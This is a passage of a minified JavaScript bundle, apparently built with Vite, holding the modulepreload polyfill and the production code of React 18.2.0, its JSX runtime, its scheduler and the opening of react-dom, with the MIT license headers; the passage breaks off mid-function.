function WN(e,t){for(var n=0;n<t.length;n++){const r=t[n];if("string"!=typeof r&&!Array.isArray(r))for(const t in r)if("default"!==t&&!(t in e)){const n=Object.getOwnPropertyDescriptor(r,t);n&&Object.defineProperty(e,t,n.get?n:{enumerable:!0,get:()=>r[t]})}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}!function(){const e=document.createElement("link").relList;if(!(e&&e.supports&&e.supports("modulepreload"))){for(const e of document.querySelectorAll('link[rel="modulepreload"]'))t(e);new MutationObserver((e=>{for(const n of e)if("childList"===n.type)for(const e of n.addedNodes)"LINK"===e.tagName&&"modulepreload"===e.rel&&t(e)})).observe(document,{childList:!0,subtree:!0})}function t(e){if(e.ep)return;e.ep=!0;const t=function(e){const t={};return e.integrity&&(t.integrity=e.integrity),e.referrerPolicy&&(t.referrerPolicy=e.referrerPolicy),"use-credentials"===e.crossOrigin?t.credentials="include":"anonymous"===e.crossOrigin?t.credentials="omit":t.credentials="same-origin",t}(e);fetch(e.href,t)}}();var GN=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function xg(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var JS={exports:{}},ud={},ZS={exports:{}},ve={},yu=Symbol.for("react.element"),HN=Symbol.for("react.portal"),KN=Symbol.for("react.fragment"),QN=Symbol.for("react.strict_mode"),XN=Symbol.for("react.profiler"),JN=Symbol.for("react.provider"),ZN=Symbol.for("react.context"),eM=Symbol.for("react.forward_ref"),tM=Symbol.for("react.suspense"),nM=Symbol.for("react.memo"),rM=Symbol.for("react.lazy"),F0=Symbol.iterator;
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */function iM(e){return null===e||"object"!=typeof e?null:"function"==typeof(e=F0&&e[F0]||e["@@iterator"])?e:null}var e_={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},t_=Object.assign,n_={};function ga(e,t,n){this.props=e,this.context=t,this.refs=n_,this.updater=n||e_}function r_(){}function Ig(e,t,n){this.props=e,this.context=t,this.refs=n_,this.updater=n||e_}ga.prototype.isReactComponent={},ga.prototype.setState=function(e,t){if("object"!=typeof e&&"function"!=typeof e&&null!=e)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,t,"setState")},ga.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")},r_.prototype=ga.prototype;var kg=Ig.prototype=new r_;kg.constructor=Ig,t_(kg,ga.prototype),kg.isPureReactComponent=!0;var V0=Array.isArray,i_=Object.prototype.hasOwnProperty,Dg={current:null},s_={key:!0,ref:!0,__self:!0,__source:!0};function o_(e,t,n){var r,i={},s=null,o=null;if(null!=t)for(r in void 0!==t.ref&&(o=t.ref),void 0!==t.key&&(s=""+t.key),t)i_.call(t,r)&&!s_.hasOwnProperty(r)&&(i[r]=t[r]);var a=arguments.length-2;if(1===a)i.children=n;else if(1<a){for(var l=Array(a),u=0;u<a;u++)l[u]=arguments[u+2];i.children=l}if(e&&e.defaultProps)for(r in a=e.defaultProps)void 0===i[r]&&(i[r]=a[r]);return{$$typeof:yu,type:e,key:s,ref:o,props:i,_owner:Dg.current}}function sM(e,t){return{$$typeof:yu,type:e.type,key:t,ref:e.ref,props:e.props,_owner:e._owner}}function Cg(e){return"object"==typeof e&&null!==e&&e.$$typeof===yu}function oM(e){var t={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,(function(e){return t[e]}))}var U0=/\/+/g;function Lf(e,t){return"object"==typeof e&&null!==e&&null!=e.key?oM(""+e.key):t.toString(36)}function Bc(e,t,n,r,i){var s=typeof e;("undefined"===s||"boolean"===s)&&(e=null);var o=!1;if(null===e)o=!0;else switch(s){case"string":case"number":o=!0;break;case"object":switch(e.$$typeof){case yu:case HN:o=!0}}if(o)return i=i(o=e),e=""===r?"."+Lf(o,0):r,V0(i)?(n="",null!=e&&(n=e.replace(U0,"$&/")+"/"),Bc(i,t,n,"",(function(e){return e}))):null!=i&&(Cg(i)&&(i=sM(i,n+(!i.key||o&&o.key===i.key?"":(""+i.key).replace(U0,"$&/")+"/")+e)),t.push(i)),1;if(o=0,r=""===r?".":r+":",V0(e))for(var a=0;a<e.length;a++){var l=r+Lf(s=e[a],a);o+=Bc(s,t,n,l,i)}else if("function"==typeof(l=iM(e)))for(e=l.call(e),a=0;!(s=e.next()).done;)o+=Bc(s=s.value,t,n,l=r+Lf(s,a++),i);else if("object"===s)throw t=String(e),Error("Objects are not valid as a React child (found: "+("[object Object]"===t?"object with keys {"+Object.keys(e).join(", ")+"}":t)+"). If you meant to render a collection of children, use an array instead.");return o}function uc(e,t,n){if(null==e)return e;var r=[],i=0;return Bc(e,r,"","",(function(e){return t.call(n,e,i++)})),r}function aM(e){if(-1===e._status){var t=e._result;(t=t()).then((function(t){(0===e._status||-1===e._status)&&(e._status=1,e._result=t)}),(function(t){(0===e._status||-1===e._status)&&(e._status=2,e._result=t)})),-1===e._status&&(e._status=0,e._result=t)}if(1===e._status)return e._result.default;throw e._result}var fn={current:null},jc={transition:null},lM={ReactCurrentDispatcher:fn,ReactCurrentBatchConfig:jc,ReactCurrentOwner:Dg};ve.Children={map:uc,forEach:function(e,t,n){uc(e,(function(){t.apply(this,arguments)}),n)},count:function(e){var t=0;return uc(e,(function(){t++})),t},toArray:function(e){return uc(e,(function(e){return e}))||[]},only:function(e){if(!Cg(e))throw Error("React.Children.only expected to receive a single React element child.");return e}},ve.Component=ga,ve.Fragment=KN,ve.Profiler=XN,ve.PureComponent=Ig,ve.StrictMode=QN,ve.Suspense=tM,ve.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=lM,ve.cloneElement=function(e,t,n){if(null==e)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var r=t_({},e.props),i=e.key,s=e.ref,o=e._owner;if(null!=t){if(void 0!==t.ref&&(s=t.ref,o=Dg.current),void 0!==t.key&&(i=""+t.key),e.type&&e.type.defaultProps)var a=e.type.defaultProps;for(l in t)i_.call(t,l)&&!s_.hasOwnProperty(l)&&(r[l]=void 0===t[l]&&void 0!==a?a[l]:t[l])}var l=arguments.length-2;if(1===l)r.children=n;else if(1<l){a=Array(l);for(var u=0;u<l;u++)a[u]=arguments[u+2];r.children=a}return{$$typeof:yu,type:e.type,key:i,ref:s,props:r,_owner:o}},ve.createContext=function(e){return(e={$$typeof:ZN,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null}).Provider={$$typeof:JN,_context:e},e.Consumer=e},ve.createElement=o_,ve.createFactory=function(e){var t=o_.bind(null,e);return t.type=e,t},ve.createRef=function(){return{current:null}},ve.forwardRef=function(e){return{$$typeof:eM,render:e}},ve.isValidElement=Cg,ve.lazy=function(e){return{$$typeof:rM,_payload:{_status:-1,_result:e},_init:aM}},ve.memo=function(e,t){return{$$typeof:nM,type:e,compare:void 0===t?null:t}},ve.startTransition=function(e){var t=jc.transition;jc.transition={};try{e()}finally{jc.transition=t}},ve.unstable_act=function(){throw Error("act(...) is not supported in production builds of React.")},ve.useCallback=function(e,t){return fn.current.useCallback(e,t)},ve.useContext=function(e){return fn.current.useContext(e)},ve.useDebugValue=function(){},ve.useDeferredValue=function(e){return fn.current.useDeferredValue(e)},ve.useEffect=function(e,t){return fn.current.useEffect(e,t)},ve.useId=function(){return fn.current.useId()},ve.useImperativeHandle=function(e,t,n){return fn.current.useImperativeHandle(e,t,n)},ve.useInsertionEffect=function(e,t){return fn.current.useInsertionEffect(e,t)},ve.useLayoutEffect=function(e,t){return fn.current.useLayoutEffect(e,t)},ve.useMemo=function(e,t){return fn.current.useMemo(e,t)},ve.useReducer=function(e,t,n){return fn.current.useReducer(e,t,n)},ve.useRef=function(e){return fn.current.useRef(e)},ve.useState=function(e){return fn.current.useState(e)},ve.useSyncExternalStore=function(e,t,n){return fn.current.useSyncExternalStore(e,t,n)},ve.useTransition=function(){return fn.current.useTransition()},ve.version="18.2.0",ZS.exports=ve;var $=ZS.exports;const Ee=xg($),Pp=WN({__proto__:null,default:Ee},[$]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var uM=$,cM=Symbol.for("react.element"),hM=Symbol.for("react.fragment"),dM=Object.prototype.hasOwnProperty,fM=uM.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,pM={key:!0,ref:!0,__self:!0,__source:!0};function a_(e,t,n){var r,i={},s=null,o=null;for(r in void 0!==n&&(s=""+n),void 0!==t.key&&(s=""+t.key),void 0!==t.ref&&(o=t.ref),t)dM.call(t,r)&&!pM.hasOwnProperty(r)&&(i[r]=t[r]);if(e&&e.defaultProps)for(r in t=e.defaultProps)void 0===i[r]&&(i[r]=t[r]);return{$$typeof:cM,type:e,key:s,ref:o,props:i,_owner:fM.current}}ud.Fragment=hM,ud.jsx=a_,ud.jsxs=a_,JS.exports=ud;var pe=JS.exports,$p={},l_={exports:{}},bn={},u_={exports:{}},c_={};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */!function(e){function t(e,t){var n=e.length;e.push(t);e:for(;0<n;){var r=n-1>>>1,s=e[r];if(!(0<i(s,t)))break e;e[r]=t,e[n]=s,n=r}}function n(e){return 0===e.length?null:e[0]}function r(e){if(0===e.length)return null;var t=e[0],n=e.pop();if(n!==t){e[0]=n;e:for(var r=0,s=e.length,o=s>>>1;r<o;){var a=2*(r+1)-1,l=e[a],u=a+1,c=e[u];if(0>i(l,n))u<s&&0>i(c,l)?(e[r]=c,e[u]=n,r=u):(e[r]=l,e[a]=n,r=a);else{if(!(u<s&&0>i(c,n)))break e;e[r]=c,e[u]=n,r=u}}}return t}function i(e,t){var n=e.sortIndex-t.sortIndex;return 0!==n?n:e.id-t.id}if("object"==typeof performance&&"function"==typeof performance.now){var s=performance;e.unstable_now=function(){return s.now()}}else{var o=Date,a=o.now();e.unstable_now=function(){return o.now()-a}}var l=[],u=[],c=1,h=null,d=3,f=!1,p=!1,m=!1,g="function"==typeof setTimeout?setTimeout:null,y="function"==typeof clearTimeout?clearTimeout:null,v=typeof setImmediate<"u"?setImmediate:null;function w(e){for(var i=n(u);null!==i;){if(null===i.callback)r(u);else{if(!(i.startTime<=e))break;r(u),i.sortIndex=i.expirationTime,t(l,i)}i=n(u)}}function b(e){if(m=!1,w(e),!p)if(null!==n(l))p=!0,A(_);else{var t=n(u);null!==t&&L(b,t.startTime-e)}}function _(t,i){p=!1,m&&(m=!1,y(k),k=-1),f=!0;var s=d;try{for(w(i),h=n(l);null!==h&&(!(h.expirationTime>i)||t&&!C());){var o=h.callback;if("function"==typeof o){h.callback=null,d=h.priorityLevel;var a=o(h.expirationTime<=i);i=e.unstable_now(),"function"==typeof a?h.callback=a:h===n(l)&&r(l),w(i)}else r(l);h=n(l)}if(null!==h)var c=!0;else{var g=n(u);null!==g&&L(b,g.startTime-i),c=!1}return c}finally{h=null,d=s,f=!1}}typeof navigator<"u"&&void 0!==navigator.scheduling&&void 0!==navigator.scheduling.isInputPending&&navigator.scheduling.isInputPending.bind(navigator.scheduling);var S,E=!1,T=null,k=-1,x=5,I=-1;function C(){return!(e.unstable_now()-I<x)}function D(){if(null!==T){var t=e.unstable_now();I=t;var n=!0;try{n=T(!0,t)}finally{n?S():(E=!1,T=null)}}else E=!1}if("function"==typeof v)S=function(){v(D)};else if(typeof MessageChannel<"u"){var M=new MessageChannel,N=M.port2;M.port1.onmessage=D,S=function(){N.postMessage(null)}}else S=function(){g(D,0)};function A(e){T=e,E||(E=!0,S())}function L(t,n){k=g((function(){t(e.unstable_now())}),n)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(e){e.callback=null},e.unstable_continueExecution=function(){p||f||(p=!0,A(_))},e.unstable_forceFrameRate=function(e){0>e||125<e?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):x=0<e?Math.floor(1e3/e):5},e.unstable_getCurrentPriorityLevel=function(){return d},e.unstable_getFirstCallbackNode=function(){return n(l)},e.unstable_next=function(e){switch(d){case 1:case 2:case 3:var t=3;break;default:t=d}var n=d;d=t;try{return e()}finally{d=n}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(e,t){switch(e){case 1:case 2:case 3:case 4:case 5:break;default:e=3}var n=d;d=e;try{return t()}finally{d=n}},e.unstable_scheduleCallback=function(r,i,s){var o=e.unstable_now();switch("object"==typeof s&&null!==s?s="number"==typeof(s=s.delay)&&0<s?o+s:o:s=o,r){case 1:var a=-1;break;case 2:a=250;break;case 5:a=1073741823;break;case 4:a=1e4;break;default:a=5e3}return r={id:c++,callback:i,priorityLevel:r,startTime:s,expirationTime:a=s+a,sortIndex:-1},s>o?(r.sortIndex=s,t(u,r),null===n(l)&&r===n(u)&&(m?(y(k),k=-1):m=!0,L(b,s-o))):(r.sortIndex=a,t(l,r),p||f||(p=!0,A(_))),r},e.unstable_shouldYield=C,e.unstable_wrapCallback=function(e){var t=d;return function(){var n=d;d=t;try{return e.apply(this,arguments)}finally{d=n}}}}(c_),u_.exports=c_;var mM=u_.exports,h_=$,Mn=mM;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */function U(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var d_=new Set,bl={};function Ks(e,t){Ho(e,t),Ho(e+"Capture",t)}function Ho(e,t){for(bl[e]=t,e=0;e<t.length;e++)d_.add(t[e])}var jr=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Lp=Object.prototype.hasOwnProperty,gM=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,z0={},B0={};function yM(e){return!!Lp.call(B0,e)||!Lp.call(z0,e)&&(gM.test(e)?B0[e]=!0:(z0[e]=!0,!1))}function vM(e,t,n,r){if(null!==n&&0===n.type)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return!r&&(null!==n?!n.acceptsBooleans:"data-"!==(e=e.toLowerCase().slice(0,5))&&"aria-"!==e);default:return!1}}function wM(e,t,n,r){if(null===t||typeof t>"u"||vM(e,t,n,r))return!0;if(r)return!1;if(null!==n)switch(n.type){case 3:return!t;case 4:return!1===t;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}function pn(e,t,n,r,i,s,o){this.acceptsBooleans=2===t||3===t||4===t,this.attributeName=r,this.attributeNamespace=i,this.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=s,this.removeEmptyString=o}var Ht={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach((function(e){Ht[e]=new pn(e,0,!1,e,null,!1,!1)})),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach((function(e){var t=e[0];Ht[t]=new pn(t,1,!1,e[1],null,!1,!1)})),["contentEditable","draggable","spellCheck","value"].forEach((function(e){Ht[e]=new pn(e,2,!1,e.toLowerCase(),null,!1,!1)})),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach((function(e){Ht[e]=new pn(e,2,!1,e,null,!1,!1)})),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach((function(e){Ht[e]=new pn(e,3,!1,e.toLowerCase(),null,!1,!1)})),["checked","multiple","muted","selected"].forEach((function(e){Ht[e]=new pn(e,3,!0,e,null,!1,!1)})),["capture","download"].forEach((function(e){Ht[e]=new pn(e,4,!1,e,null,!1,!1)})),["cols","rows","size","span"].forEach((function(e){Ht[e]=new pn(e,6,!1,e,null,!1,!1)})),["rowSpan","start"].forEach((function(e){Ht[e]=new pn(e,5,!1,e.toLowerCase(),null,!1,!1)}));var Ng=/[\-:]([a-z])/g;function Mg(e){return e[1].toUpperCase()}function Rg(e,t,n,r){var i=Ht.hasOwnProperty(t)?Ht[t]:null;(null!==i?0!==i.type:r||!(2<t.length)||"o"!==t[0]&&"O"!==t[0]||"n"!==t[1]&&"N"!==t[1])&&(wM(t,n,i,r)&&(n=null),r||null===i?yM(t)&&(null===n?e.removeAttribute(t):e.setAttribute(t,""+n)):i.mustUseProperty?e[i.propertyName]=null===n?3!==i.type&&"":n:(t=i.attributeName,r=i.attributeNamespace,null===n?e.removeAttribute(t):(n=3===(i=i.type)||4===i&&!0===n?"":""+n,r?e.setAttributeNS(r,t,n):e.setAttribute(t,n))))}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach((function(e){var t=e.replace(Ng,Mg);Ht[t]=new pn(t,1,!1,e,null,!1,!1)})),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach((function(e){var t=e.replace(Ng,Mg);Ht[t]=new pn(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)})),["xml:base","xml:lang","xml:space"].forEach((function(e){var t=e.replace(Ng,Mg);Ht[t]=new pn(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)})),["tabIndex","crossOrigin"].forEach((function(e){Ht[e]=new pn(e,1,!1,e.toLowerCase(),null,!1,!1)})),Ht.xlinkHref=new pn("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),["src","href","action","formAction"].forEach((function(e){Ht[e]=new pn(e,1,!1,e.toLowerCase(),null,!0,!0)}));var Qr=h_.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,cc=Symbol.for("react.element"),Eo=Symbol.for("react.portal"),To=Symbol.for("react.fragment"),Ag=Symbol.for("react.strict_mode"),Fp=Symbol.for("react.profiler"),f_=Symbol.for("react.provider"),p_=Symbol.for("react.context"),bg=Symbol.for("react.forward_ref"),Vp=Symbol.for("react.suspense"),Up=Symbol.for("react.suspense_list"),Og=Symbol.for("react.memo"),ci=Symbol.for("react.lazy"),m_=Symbol.for("react.offscreen"),j0=Symbol.iterator;function Va(e){return null===e||"object"!=typeof e?null:"function"==typeof(e=j0&&e[j0]||e["@@iterator"])?e:null}var Ff,st=Object.assign;function rl(e){if(void 0===Ff)try{throw Error()}catch(e){var t=e.stack.trim().match(/\n( *(at )?)/);Ff=t&&t[1]||""}return"\n"+Ff+e}var Vf=!1;function Uf(e,t){if(!e||Vf)return"";Vf=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),"object"==typeof Reflect&&Reflect.construct){try{Reflect.construct(t,[])}catch(e){var r=e}Reflect.construct(e,[],t)}else{try{t.call()}catch(e){r=e}e.call(t.prototype)}else{try{throw Error()}catch(e){r=e}e()}}catch(t){if(t&&r&&"string"==typeof t.stack){for(var i=t.stack.split("\n"),s=r.stack.split("\n"),o=i.length-1,a=s.length-1;1<=o&&0<=a&&i[o]!==s[a];)a--;for(;1<=o&&0<=a;o--,a--)if(i[o]!==s[a]){if(1!==o||1!==a)do{if(o--,0>--a||i[o]!==s[a]){var l="\n"+i[o].replace(" at new "," at ");return e.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",e.displayName)),l}}while(1<=o&&0<=a);break}}}finally{Vf=!1,Error.prepareStackTrace=n}return(e=e?e.displayName||e.name:"")?rl(e):""}function SM(e){switch(e.tag){case 5:return rl(e.type);case 16:return rl("Lazy");case 13:return rl("Suspense");case 19:return rl("SuspenseList");case 0:case 2:case 15:return e=Uf(e.type,!1);case 11:return e=Uf(e.type.render,!1);case 1:return e=Uf(e.type,!0);default:return""}}function zp(e){if(null==e)return null;if("function"==typeof e)return e.displayName||e.name||null;if("string"==typeof e)return e;switch(e){case To:return"Fragment";case Eo:return"Portal";case Fp:return"Profiler";case Ag:return"StrictMode";case Vp:return"Suspense";case Up:return"SuspenseList"}if("object"==typeof e)switch(e.$$typeof){case p_:return(e.displayName||"Context")+".Consumer";case f_:return(e._context.displayName||"Context")+".Provider";case bg:var t=e.render;return(e=e.displayName)||(e=""!==(e=t.displayName||t.name||"")?"ForwardRef("+e+")":"ForwardRef"),e;case Og:return null!==(t=e.displayName||null)?t:zp(e.type)||"Memo";case ci:t=e._payload,e=e._init;try{return zp(e(t))}catch{}}return null}function _M(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=(e=t.render).displayName||e.name||"",t.displayName||(""!==e?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return zp(t);case 8:return t===Ag?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if("function"==typeof t)return t.displayName||t.name||null;if("string"==typeof t)return t}return null}function Ai(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":case"object":return e;default:return""}}function g_(e){var t=e.type;return(e=e.nodeName)&&"input"===e.toLowerCase()&&("checkbox"===t||"radio"===t)}function EM(e){var t=g_(e)?"checked":"value",n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),r=""+e[t];if(!e.hasOwnProperty(t)&&typeof n<"u"&&"function"==typeof n.get&&"function"==typeof n.set){var i=n.get,s=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return i.call(this)},set:function(e){r=""+e,s.call(this,e)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return r},setValue:function(e){r=""+e},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function hc(e){e._valueTracker||(e._valueTracker=EM(e))}function y_(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),r="";return e&&(r=g_(e)?e.checked?"true":"false":e.value),(e=r)!==n&&(t.setValue(e),!0)}function uh(e){if(typeof(e=e||(typeof document<"u"?document:void 0))>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function Bp(e,t){var n=t.checked;return st({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??e._wrapperState.initialChecked})}function q0(e,t){var n=null==t.defaultValue?"":t.defaultValue,r=null!=t.checked?t.checked:t.defaultChecked;n=Ai(null!=t.value?t.value:n),e._wrapperState={initialChecked:r,initialValue:n,controlled:"checkbox"===t.type||"radio"===t.type?null!=t.checked:null!=t.value}}function v_(e,t){null!=(t=t.checked)&&Rg(e,"checked",t,!1)}function jp(e,t){v_(e,t);var n=Ai(t.value),r=t.type;if(null!=n)"number"===r?(0===n&&""===e.value||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else if("submit"===r||"reset"===r)return void e.removeAttribute("value");t.hasOwnProperty("value")?qp(e,t.type,n):t.hasOwnProperty("defaultValue")&&qp(e,t.type,Ai(t.defaultValue)),null==t.checked&&null!=t.defaultChecked&&(e.defaultChecked=!!t.defaultChecked)}function Y0(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var r=t.type;if(!("submit"!==r&&"reset"!==r||void 0!==t.value&&null!==t.value))return;t=""+e._wrapperState.initialValue,n||t===e.value||(e.value=t),e.defaultValue=t}""!==(n=e.name)&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,""!==n&&(e.name=n)}function qp(e,t,n){("number"!==t||uh(e.ownerDocument)!==e)&&(null==n?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+n&&(e.defaultValue=""+n))}var il=Array.isArray;function Lo(e,t,n,r){if(e=e.options,t){t={};for(var i=0;i<n.length;i++)t["$"+n[i]]=!0;for(n=0;n<e.length;n++)i=t.hasOwnProperty("$"+e[n].value),e[n].selected!==i&&(e[n].selected=i),i&&r&&(e[n].defaultSelected=!0)}else{for(n=""+Ai(n),t=null,i=0;i<e.length;i++){if(e[i].value===n)return e[i].selected=!0,void(r&&(e[i].defaultSelected=!0));null!==t||e[i].disabled||(t=e[i])}null!==t&&(t.selected=!0)}}function Yp(e,t){if(null!=t.dangerouslySetInnerHTML)throw Error(U(91));return st({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function W0(e,t){var n=t.value;if(null==n){if(n=t.children,t=t.defaultValue,null!=n){if(null!=t)throw Error(U(92));if(il(n)){if(1<n.length)throw Error(U(93));n=n[0]}t=n}null==t&&(t=""),n=t}e._wrapperState={initialValue:Ai(n)}}function w_(e,t){var n=Ai(t.value),r=Ai(t.defaultValue);null!=n&&((n=""+n)!==e.value&&(e.value=n),null==t.defaultValue&&e.defaultValue!==n&&(e.defaultValue=n)),null!=r&&(e.defaultValue=""+r)}function G0(e){var t=e.textContent;t===e._wrapperState.initialValue&&""!==t&&null!==t&&(e.value=t)}function S_(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Wp(e,t){return null==e||"http://www.w3.org/1999/xhtml"===e?S_(t):"http://www.w3.org/2000/svg"===e&&"foreignObject"===t?"http://www.w3.org/1999/xhtml":e}var dc,__=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(t,n,r,i){MSApp.execUnsafeLocalFunction((function(){return e(t,n)}))}:e}((function(e,t){if("http://www.w3.org/2000/svg"!==e.namespaceURI||"innerHTML"in e)e.innerHTML=t;else{for((dc=dc||document.createElement("div")).innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=dc.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}}));function Ol(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&3===n.nodeType)return void(n.nodeValue=t)}e.textContent=t}var pl={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},TM=["Webkit","ms","Moz","O"];function E_(e,t,n){return null==t||"boolean"==typeof t||""===t?"":n||"number"!=typeof t||0===t||pl.hasOwnProperty(e)&&pl[e]?(""+t).trim():t+"px"}function T_(e,t){for(var n in e=e.style,t)if(t.hasOwnProperty(n)){var r=0===n.indexOf("--"),i=E_(n,t[n],r);"float"===n&&(n="cssFloat"),r?e.setProperty(n,i):e[n]=i}}Object.keys(pl).forEach((function(e){TM.forEach((function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),pl[t]=pl[e]}))}));var xM=st({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function 